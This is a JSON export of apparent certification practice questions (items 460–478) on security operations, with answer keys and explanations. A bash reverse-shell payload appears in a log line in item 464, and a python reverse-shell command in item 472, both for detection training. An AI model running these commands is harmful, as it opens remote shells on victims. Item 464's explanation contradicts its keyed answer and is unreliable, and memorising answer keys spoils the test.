class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Organized crime</li></ul></div><!--EndFragment-->","correct":"B","explanation":"The suspicious traffic began immediately after installing newly received network switches. This suggests the devices may have been compromised before they reached the company"},{"number":460,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">Which of the following best describes the benefit of implementing a PAM solution?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Measuring and validating the integrity of the database</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Controlling and monitoring the use of administrative accounts</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Storing and protecting PKI certificate private keys</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Configuring and enforcing password complexity requirements</li></ul></div><!--EndFragment-->","correct":"B","explanation":"A Privileged Access Management (PAM) solution is specifically designed to:\n\nSecure privileged (admin/root) accounts\n\nControl who can use them\n\nMonitor and record privileged sessions\n\nEnforce least privilege\n\nRotate and vault privileged credentials\n\nPAM reduces the risk of credential abuse and limits damage from compromised admin accounts."},{"number":461,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">Several users received a phishing email containing a malicious file that bypassed the organization’s email security tool. Based on the SIEM logs, users did not open the file within the environment. In which of the following phases of the MITRE ATT&amp;CK framework was the attack stopped?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Lateral movement</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Execution</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Initial access</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Discovery</li></ul></div><!--EndFragment-->","correct":"B","explanation":"The phishing email successfully reached the users (Initial Access), but the malicious file was never opened/executed.\n\n🧠 Think: Received ≠ Executed → stopped at Execution.\n\nBecause the file was never opened, the attack stopped at execution, which means \nthe malicious payload did not run even though initial access succeeded."},{"number":462,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">During the triage of a SIEM alarm, a security analyst identifies the following activity on a .bash_history file:<br><br><img src=\"https://img.examtopics.com/cs0-003/image104.png\" style=\"vertical-align: middle; border-style: none;\"><br><br>Which of the following actions should the analyst take?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Declare an incident and look for data exfiltration.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Declare an incident and look for lateral movements.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Declare a false positive and close the alarm.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Declare an incident and look for malware in the affected machine.</li></ul></div><!--EndFragment-->","correct":"A","explanation":"The script reads secretsauce.txt, requests data from another server, and then POSTs the returned data to an external IP—strong evidence of data exfiltration.\n\n🧠 Think: Read sensitive data → send it externally = exfiltration.\n\nThe script clearly indicates exfiltration, and \nthe next priority is to preserve evidence and scope what data was accessed and transmitted before containment decisions are made."},{"number":463,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">Which of the following is the appropriate phase in the incident response process to perform a vulnerability scan to determine the effectiveness of corrective actions?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Lessons learned</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Reporting</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Recovery</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Root cause analysis</li></ul></div><!--EndFragment-->","correct":"C","explanation":"A vulnerability scan during recovery verifies that corrective actions worked and the vulnerability has been properly remediated.\n\n🧠 Think: Recovery = fix → verify → restore.\n\nA vulnerability scan belongs in recovery because it verifies remediation; \nthe scan should be repeated after corrective actions to confirm the vulnerability is no longer exploitable before normal operations are fully restored."},{"number":464,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">A security analyst identifies the following log entry in the web server logs:<br><br>10.203.10.23 - - [22/May/2024 11:06:29] \"GET /admin?cmd=bash+-i+&gt;%26+/dev/tcp/10.20.10.22/1234+0%3E%261 http/1.1\" 200 -<br><br>Which of the following best explains the log entry?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>This was caused by an administrator logging in to a website using the command line.</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>This is a successful lateral movement abusing an RCE vulnerability.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>This is a failed attack attempting to exploit an LFI vulnerability.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>This was caused by a successful RFI vulnerability exploitation.</li></ul></div><!--EndFragment-->","correct":"B","explanation":"The URL contains a bash reverse shell:\n\n/dev/tcp/10.20.10.22/1234\n\nThe 200 response indicates the request was successfully processed, consistent with RFI leading to command execution.\n\n🧠 Remember: RFI → remote file → code execution → possible reverse shell.\n\nThe request shows a reverse-shell payload, but the log alone does not prove successful exploitation because \nHTTP 200 only confirms the server returned a response, not that the command executed."},{"number":465,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">A security analyst receives an alert with the following packet capture:<br><br><img src=\"https://img.examtopics.com/cs0-003/image105.png\" style=\"vertical-align: middle; border-style: none;\"><br><br>Which of the following conclusions should the analyst reach about this incident?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>EnCase is enumerating a server.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>A Nessus proxy is manipulating traffic.</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>An Nmap scan is occurring.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Metasploit is installing on a target.</li></ul></div><!--EndFragment-->","correct":"C","explanation":"The packet capture in the image shows multiple TCP SYN packets followed by RST, ACK responses, which is a strong indicator of a port scan in progress.\nSYN packets from 10.203.10.23 to 10.203.10.17 on ports 80 and 443.\nRST, ACK responses from 10.203.10.17, indicating that the target is rejecting the connection attempts.\nThis pattern is typical of a TCP SYN scan, where the scanner sends SYN packets to probe for open ports and observes the response."},{"number":466,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">An after-action review of a ransomware attack on a company identified deficiencies in responsiveness and consistency. Which of the following choices would best facilitate improvement of these deficiencies?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Leverage a SIEM.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Utilize threat intelligence sharing.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Source multiple threat feeds.</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Implement SOAR.</li></ul></div><!--EndFragment-->","correct":"D","explanation":"SOAR automates and standardizes incident response workflows, improving responsiveness and consistency during ransomware incidents.\n\n🧠 Think: SOAR = automate + standardize response.\n\nSOAR improves ransomware response by automating and standardizing workflows, while \nSIEM mainly improves detection and centralized visibility."},{"number":467,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">A security analyst is performing a malware analysis on a device and receives the following instructions:<br><br>• Reduce the blast radius of the potential threat.<br>• Preserve forensic data for post-incident analysis.<br>• If securely possible, preserve connectivity for live analysis.<br><br>Which of the following will best help the analyst during the investigation?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Configure an EDR agent to isolate the network with authorized exceptions to the NOC VLAN.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Execute a SOAR playbook to trigger a malware scan on the company's assets.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Use file integrity monitoring to determine if the suspicious file was modified.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Collect the suspicious file using SFTP and reimage the device.</li></ul></div><!--EndFragment-->","correct":"A","explanation":"EDR isolation limits the malware's spread, while allowing controlled connectivity for live analysis and preserving forensic evidence.\n\n🧠 Think: EDR isolation = contain + preserve + investigate.\n\nEDR isolation best balances containment and investigation because it limits spread while preserving the device for analysis; \nthe authorized NOC VLAN exception is safer than reimaging when live forensic access is still needed."},{"number":468,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">Which of the following is the practice of controlling how evidence is handled to ensure its integrity during an investigation?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Chain of custody</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Root cause analysis</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Incident response</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Evidence collection</li></ul></div><!--EndFragment-->","correct":"A","explanation":"Chain of custody documents who handled evidence, when, and how, ensuring its integrity and admissibility during an investigation.\n\n🧠 Remember: Chain of custody = track the evidence from start to finish.\n\nChain of custody protects evidence integrity by documenting each transfer, so \nthe required records for a defensible chain of custody remain complete throughout the investigation."},{"number":469,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">A security manager reviews the permissions for the approved users of a shared folder and finds accounts that are not on the approved access list. While investigating an incident, a user discovers data discrepancies in the file. Which of the following best describes this activity?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Filesystem anomaly</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Illegal software</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Unauthorized changes</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Data exfiltration</li></ul></div><!--EndFragment-->","correct":"C","explanation":"The file has unexpected data changes, and there are accounts with unauthorized access to the shared folder.\n\n🧠 Think: Unexpected file modifications → Unauthorized changes.\n\nUnexpected file modifications by accounts outside the approved access list indicate \nunauthorized changes rather than data exfiltration, because the evidence shows altered data and improper access, not confirmed data removal."},{"number":470,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">A SOC analyst is reviewing the weekly EDR report. The report shows that the same application was blocked once every 24 hours. Which of the following tools should the analyst use to further investigate the incident?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Registry Editor</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>services.msc</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Task Scheduler</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>MSConfig</li></ul></div><!--EndFragment-->","correct":"C","explanation":"An application being blocked once every 24 hours suggests a scheduled task may be repeatedly launching it.\n\n🧠 Think: Regular time interval → Task Scheduler.\n\nA 24-hour execution pattern points to a scheduled task, so \nreviewing the task’s trigger, action, and run history can confirm how the blocked application is being launched."},{"number":471,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">A finance department employee opens an unsolicited email that contains a malicious payload. The payload quickly spreads through the finance department, but does not affect other departments. Which of the following best explains why the payload does not affect all departments?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>OS version</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Offline computers</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Firewall configuration</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Network segmentation</li></ul></div><!--EndFragment-->","correct":"D","explanation":"Network segmentation isolates departments into separate network segments, preventing malware from easily spreading from the finance department to other departments.\n\n🧠 Think: Different departments + malware contained to one → Network segmentation.\n\nBecause the payload remained confined to finance, \nnetwork segmentation limited lateral movement between departmental network segments, even though the initial infection succeeded."},{"number":472,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">A security analyst is responding to an incident that is related to an unauthorized communication between systems. While triaging the event, the analyst obtains the following outputs:<br><br><img src=\"https://img.examtopics.com/cs0-003/image106.png\" style=\"vertical-align: middle; border-style: none;\"><br><br>Which of the following commands should the analyst use to terminate the malicious session?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>kill -9 4347</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>kill -9 6015</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>kill -9 701</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>kill -9 5996</li></ul></div><!--EndFragment-->","correct":"D","explanation":"The process with PID 5996 is running a Python script that establishes a socket connection to 10.203.10.22:1234, which is identified as the unauthorized communication. Terminating this process will stop the malicious session.\n\nHere’s a breakdown of the command:\npython3 -c \"import socket, subprocess, os; s=socket.socket(...); s.connect(('10.203.10.22', 1234)); ...\"\nA. kill -9 4347 → This is pipewire, a legitimate multimedia service.\nB. kill -9 6015 → This is a regular bash shell, not tied to the malicious session.\nC. kill -9 701 → This is the top command, used for monitoring processes.\n"},{"number":473,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">Which of the following explains why a company would consider enriching data before sending it to the SIEM?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>To prevent injection attacks against the log management system</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>To reduce the amount and cost of data storage for security incidents</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>To provide more information to SOC analysts when analyzing events</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>To normalize the data before saving it to the database tables</li></ul></div><!--EndFragment-->","correct":"C","explanation":"Data enrichment adds useful context to raw logs, such as user identity, asset information, threat intelligence, or geolocation.\n\n🧠 Think: Enrichment = add context → better analysis.\n\nData enrichment improves event analysis by adding context, and \nnormalization instead makes different log formats consistent for SIEM processing."},{"number":474,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">A company suspects a coordinated effort to attack their platform. Web server logs show malicious activity from many different source IP addresses located in different countries. Which of the following will best help a security analyst identify the requests connected to this campaign?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Modify the web server logs to include the X-Forwarded-For header.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Create a custom SIEM query to integrate threat intel IoCs associated with the threat actor.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Enrich the web server request logs with full WHOIS data on all available sources.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Add GeoIP location for the source IP addresses to the log entries.</li></ul></div><!--EndFragment-->","correct":"B","explanation":"Threat intelligence IoCs can help the analyst correlate activity from many different IP addresses and identify requests associated with the same threat actor/campaign.\n\n🧠 Think: Different IPs + coordinated campaign → correlate using threat intelligence.\n\nThreat intelligence can correlate disparate indicators, while \nGeoIP mainly adds geographic context rather than linking requests to the same campaign."},{"number":475,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">The DevSecOps team is remediating an SSRF issue on the company's public-facing website. Which of the following is the best mitigation technique to address this issue?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Place a WAF in front of the web server.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Install a CASB in front of the web server</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Put a forward proxy in front of the web server.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Implement MFA in front of the web server</li></ul></div><!--EndFragment-->","correct":"A","explanation":"A WAF (Web Application Firewall) can help detect and block malicious requests attempting to exploit SSRF.\n\n🧠 Think: Web attack → WAF."},{"number":476,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">A security analyst wants to implement new monitoring controls in order to find abnormal account activity for traveling employees. Which of the following techniques would deliver the expected results?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Malicious command interpretation</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Network monitoring</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>User behavior analysis</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>SSL inspection</li></ul></div><!--EndFragment-->","correct":"C","explanation":"UEBA (User and Entity Behavior Analytics) detects abnormal account behavior, such as impossible travel, unusual login locations, or abnormal access patterns.\n\n🧠 Think: Abnormal user behavior → UEBA.\n\nUEBA detects abnormal account activity by comparing behavior against established baselines, making it especially effective for \nimpossible-travel and unusual-login detection in traveling employees."},{"number":477,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">A SOC manager is looking for a solution that can improve the response time and execute predetermined instructions. Which of the following is the best solution based on these requirements?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>XDR</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>SIEM</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>CASB</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>SOAR</li></ul></div><!--EndFragment-->","correct":"D","explanation":"SOAR (Security Orchestration, Automation, and Response) can execute predefined playbooks automatically, which improves incident response time.\n\n🧠 Think: SOAR = automate predetermined actions → faster response.\n\nSOAR improves response speed by executing predefined playbooks, while \nSIEM primarily centralizes and correlates security events for analysis rather than automating the response itself."},{"number":478,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">Which of the following is the best technical method to protect sensitive data at an organizational level?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); 